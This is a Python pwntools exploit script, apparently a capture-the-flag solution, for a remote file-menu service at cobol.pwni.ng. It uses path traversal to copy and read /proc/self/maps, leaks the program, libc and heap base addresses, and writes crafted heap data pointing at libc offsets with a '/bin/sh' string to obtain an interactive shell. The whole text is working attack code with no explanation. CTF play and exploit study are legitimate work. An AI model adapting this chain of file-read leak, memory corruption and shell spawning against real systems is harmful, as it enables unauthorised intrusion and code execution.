__author__ = "cMc_SARS"

from pwn import *
context(terminal='zsh', arch='amd64', log_level='info')

p = remote('cobol.pwni.ng', 3083)

# def recvptr(self): return u64(self.recvn(6).ljust(8, "\x00"))
def recvptr(self): return u64(self.recvline().rstrip().ljust(8, "\x00"))
pwnlib.tubes.remote.remote.recvptr = recvptr
pwnlib.tubes.process.process.recvptr = recvptr

def chose(n):
    p.sendlineafter("> ", str(n))

def create_file(a0="AAAA", a1="1", a2="32"):
    chose("1")
    p.sendafter("File Name: ", (str(a0)+"\n")[:])
    p.sendafter("Index: ", (str(a1)+"\n")[:])
    p.sendafter("Buf Size: ", (str(a2)+"\n")[:])

def open_file(a0="AAAA", a1="1", a2="32"):
    chose("2")
    p.sendafter("File Name: ", (str(a0)+"\n")[:])
    p.sendafter("Index: ", (str(a1)+"\n")[:])
    p.sendafter("Buf Size: ", (str(a2)+"\n")[:])

def read_file(a0="1"):
    chose("3")
    p.sendafter("Index: ", (str(a0)+"\n")[:])

def write_file(a0="1", a1="AAAAAAAA", a2="n"):
    chose("4")
    p.sendafter("Index:", (str(a0)+"\n")[:])
    p.sendafter("Input:", (str(a1)+"\n")[:])
    p.sendafter("Read More (Y/y for yes)", (str(a2)+"\n")[:])

def close_file(a0="1"):
    chose("5")
    p.sendafter("Index: ", (str(a0)+"\n")[:])

def copy_file(a1, a2):
    chose(6)
    p.sendlineafter("Enter filename1:", a1)
    p.sendlineafter("Enter filename2:", a2)

import re
def get_heap(_vmmap, _name) :
    _regex = '^.*rw-p.*{}.*$'.format(_name)
    _line = [_ for _ in _vmmap.split('\n') if re.match(_regex, _)][0]
    return int(_line.split('-')[0], 16)
def get_base(_vmmap, _name) :
    _regex = '^.*r-xp.*{}.*$'.format(_name)
    _line = [_ for _ in _vmmap.split('\n') if re.match(_regex, _)][0]
    return int(_line.split('-')[0], 16)

maps_path = "../../../../../proc/self/maps"
leak_path = "C"

copy_file(maps_path, leak_path)
open_file(leak_path, 1, 0x1000)
read_file(1)

vmmap = p.recvuntil("-----------------------")
prog_base = get_base(vmmap, "chall")
libc_base = get_base(vmmap, "libc-2.27.so")
heap_base = get_heap(vmmap, "heap")
print("prog base: 0x{:x}".format(prog_base))
print("libc base: 0x{:x}".format(libc_base))
print("heap base: 0x{:x}".format(heap_base))

fn = "D" * 0x50
create_file(fn, 2, 0x50)
write_file(2, p64(prog_base+0x206950), "n")
copy_file(fn, "E")
create_file("AAAA", 3, 0x50)
write_file(3, "/bin/sh\x00", 'n')
create_file("AAAA", 4, 0x50)
payload = "\x00"*6
mem = [0x0000000200000004, heap_base + 0xb0c0, 0x0000000000000025, 0x0000000000000000,0x0000000100000004, heap_base + 0xb0f0, 0x0000000000000000, libc_base + 0x97140, libc_base + 0x4f550]
payload += flat(mem)
write_file(4, payload, 'n')
close_file(3)
p.interactive()
